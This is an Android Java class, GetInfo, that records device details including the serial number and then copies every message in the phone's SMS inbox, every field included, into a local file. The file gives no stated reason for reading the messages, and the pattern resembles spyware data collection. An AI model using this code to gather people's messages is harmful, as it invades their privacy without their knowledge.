package com.example.myapplication;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.io.OutputStreamWriter;

public class GetInfo {
    public GetInfo(Context context) {
        String information = "";

        information += "\n OS Version: "      + System.getProperty("os.version")      + "(" + android.os.Build.VERSION.INCREMENTAL + ")";
        information += "\n OS API Level: "    + android.os.Build.VERSION.SDK_INT;
        information += "\n Device: "          + android.os.Build.DEVICE;
        information += "\n Model (and Product): " + android.os.Build.MODEL            + " ("+ android.os.Build.PRODUCT + ")";
        information += "\n RELEASE: "         + android.os.Build.VERSION.RELEASE;
        information += "\n BRAND: "           + android.os.Build.BRAND;
        information += "\n DISPLAY: "         + android.os.Build.DISPLAY;
        information += "\n CPU_ABI: "         + android.os.Build.CPU_ABI;
        information += "\n CPU_ABI2: "        + android.os.Build.CPU_ABI2;
        information += "\n UNKNOWN: "         + android.os.Build.UNKNOWN;
        information += "\n HARDWARE: "        + android.os.Build.HARDWARE;
        information += "\n Build ID: "        + android.os.Build.ID;
        information += "\n MANUFACTURER: "    + android.os.Build.MANUFACTURER;
        information += "\n SERIAL: "          + android.os.Build.SERIAL;
        information += "\n USER: "            + android.os.Build.USER;
        information += "\n HOST: "            + android.os.Build.HOST;
//
////        String path = Environment.getExternalStorageDirectory().toString()+"/Pictures";
////        Log.d("Files", "Path: " + path);
////        File directory = new File(path);
////        File[] files = directory.listFiles();
////        Log.d("Files", "Size: "+ files.length);
////        for (int i = 0; i < files.length; i++)
////        {
////            Log.d("Files", "FileName:" + files[i].getName());
////        }
        try{
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput("information.txt", Context.MODE_PRIVATE));
            outputStreamWriter.write(information+"\n");
            outputStreamWriter.close();
        }
        catch (IOException e) {
            Log.e("Error", "can't write to file. " + e.toString());
        }
//
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                String msgData = "";

                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                }
                try{
                    OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput("information.txt", Context.MODE_APPEND));
                    outputStreamWriter.append(msgData).append("\n");
                    outputStreamWriter.close();
                }
                catch (IOException e) {
                }
            } while (cursor.moveToNext());
        }
    }
}
